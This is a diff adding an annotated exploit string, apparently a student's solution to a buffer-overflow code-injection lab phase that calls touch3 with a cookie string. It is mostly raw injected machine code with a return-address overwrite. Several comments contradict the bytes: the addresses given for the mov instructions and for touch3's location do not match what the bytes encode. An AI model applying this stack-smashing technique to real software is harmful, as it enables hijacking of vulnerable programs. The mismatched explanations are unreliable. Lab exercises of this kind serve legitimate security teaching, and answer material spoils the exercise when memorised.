@@ -1,0 +1,16 @@
+48 c7 c7 b7 e5 67 55 48 c7 c4 a7 e5 67 55 c3 a8 18 40 00 00 00 00 00 00 00 00 01 23 45 67 89 32 64 32 37 34 33 37 38 00 98 e5 67 55
+
+48 c7 c7 b7 e5 67 55 mov $0x556735b7, %rdi   # here we store the address where I stored the cookie string (check below)
+	#Notice, this is at the beginning of the stack for buffer at address 0x55673598 I believe
+
+48 c7 c4 a7 e5 67 55 mov $0x5567e5a2,%rsp    #here we are setting the stack pointer to the address we want to go to when we call ret in the next instruction. It was at this address space that I added the address to the touch3 function
+
+c3 retq    #this then goes to where %rsp is pointing to retrive the return address
+
+a8 18 40   #this is the address of touch3 in little endian ordering, notice this starts at 0x5567e5a2 as mentioned above
+
+00 00 00 00 00 00 00 00 01 23 45 67 89  - this is just filler
+
+32 64 32 37 34 33 37 38 00 - this is the cookie in string format, just one character at a time. notice, the first character is at address $0x556735b7, the address we store in %rdi. As mentioned in the instructions, we were to order this in big endian order
+
+98 e5 67 55 - this is the address at the top of the stack where we initially began our instructions. This is what was placed as the return address.
